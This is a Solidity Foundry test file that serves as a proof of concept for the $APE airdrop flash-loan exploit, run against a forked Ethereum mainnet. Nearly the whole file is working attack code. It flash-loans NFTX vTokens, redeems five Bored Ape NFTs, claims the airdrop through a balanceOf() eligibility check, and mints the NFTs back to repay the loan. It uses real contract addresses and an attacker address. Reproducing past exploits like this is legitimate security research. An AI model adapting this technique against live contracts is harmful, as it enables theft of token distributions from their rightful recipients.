// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./Interface.sol";
/*
$APE Airdrop Flash Loan Exploit PoC

alpha.balanceOf() and beta.balanceOf() are checked in line 105 to ensure that the caller is really 
a BAYC/MAYC owner.

Projects generate a merkle tree and commit only the merkle root onto the blockchain to check for Airdrops.

NFTX is one of the few platforms which allows users to flash loan ERC721s for certain purposes. Specifically, the flashLoan() function in the NFTVault contract allows a user to borrow an arbitrary amount of vToken which can be used to redeem the underlying NFT.

1 BAYC redeem == 1.04 vTokens

Steps
1. Buy a Bored Ape NFT #1060
2. FlashLoan 5.2 vTokens to redeem 5 Bored Ape NFT
3. Call the redeem function on the Airdrop contract that calls balanceOf() to check the NFTs an address holds
4. Mint the vTokens and pay back the Flashloan
*/
contract ApeAirdropExploit is DSTest {

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IBAYCi bayc =  IBAYCi(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    INFTXVault NFTXVault = INFTXVault(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
    IAirdrop AirdropGrapesToken = IAirdrop(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);
    IERC20 ape = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/eth", 14403948);
    }

    function test() public {
        cheats.startPrank(0x6703741e913a30D6604481472b6d81F3da45e6E8);
        //buy the BAYC #1060 NFT
        bayc.transferFrom(0x6703741e913a30D6604481472b6d81F3da45e6E8, address(this), 1060);
        emit log_named_decimal_uint("Before exploit, Attacker balance of APE is", ape.balanceOf(address(this)),18);

        NFTXVault.approve(address(NFTXVault), type(uint256).max);
        NFTXVault.flashLoan(address(this), address(NFTXVault), 5200000000000000000, "");  // flash loan 5.2 vTokens tokens from the NFTX Vault 
        emit log_named_decimal_uint("After exploiting, Attacker balance of APE is", ape.balanceOf(address(this)),18);
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        uint256[] memory blank = new uint256[](0);

        // The attacker redeems the following BAYC NFTs
        NFTXVault.redeem(5, blank);   

        //Claim the $APE tokens
        AirdropGrapesToken.claimTokens();  

        bayc.setApprovalForAll(address(NFTXVault), true);

        uint256[] memory nfts = new uint256[](6); 
        nfts[0] = 7594;
        nfts[1] = 4755;
        nfts[2] = 9915;
        nfts[3] = 8214;
        nfts[4] = 8167;
        nfts[5] = 1060;

        NFTXVault.mint(nfts, blank);

        NFTXVault.approve(address(NFTXVault), type(uint256).max);

        return CALLBACK_SUCCESS;
    }

    //enables a contract address to receive ERC721 NFT via safeTransfer
    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
        ) 
    external returns (bytes4) {
        return this.onERC721Received.selector;
    }

}